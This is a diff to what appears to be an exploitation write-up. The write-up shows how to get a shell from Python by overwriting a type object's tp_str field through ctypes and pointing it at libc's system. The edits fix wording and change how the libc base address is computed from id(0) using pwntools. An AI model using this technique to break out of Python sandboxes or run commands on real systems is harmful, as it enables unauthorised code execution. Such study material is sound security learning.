@@ -60,7 +60,7 @@ Py_ssize_t ob_refcnt;
 PyTypeObject *ob_type;
 ```
 
-We can overwrite a field in order to execute what we want.
+We can define a field in order to execute what we want.
 An interesting one is `tp_str`, why? Let's look at the function `PyObject_Str`:
 
 ```c++
@@ -100,8 +100,8 @@ from _ctypes import PyObj_FromPtr
 context.binary = elf = ELF("/usr/bin/python3")
 libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
 
-zero_system_offset = 0x1a7ca0 # This may change depending on your Python version. You can find it by doing id(0) - system inside gdb
-libc.address = id(0) + zero_system_offset - libc.sym["system"]
+zero_libc_offset = 0x156f30 # This may change depending on your Python version. You can find it by doing libc_base_addr-id(0) inside gdb
+libc.address = id(0) + zero_libc_offset
 
 print(f"[ + ] libc base address: {hex(libc.address)}")
 
@@ -168,8 +168,8 @@ from _ctypes import PyObj_FromPtr
 context.binary = elf = ELF("/usr/bin/python3", checksec=False)
 libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
 
-zero_system_offset = 0x1a7ca0
-libc.address = id(0) + zero_system_offset - libc.sym["system"] # The offset will always be the same
+zero_libc_offset = 0x156f30 # This may change depending on your Python version. You can find it by doing libc_base_addr-id(0) inside gdb
+libc.address = id(0) + zero_libc_offset
 
 print(f"[ + ] libc base address: {hex(libc.address)}")
 
@@ -194,7 +194,7 @@ And... We got a shell!
 
 
 ## Note
-Since we overwrote other fields while overwriting `tp_str`, we can trigger the call with something like this:
+Since we there are other fields before `tp_str`, we can trigger the call with something like this:
 
 ```py
 b.a
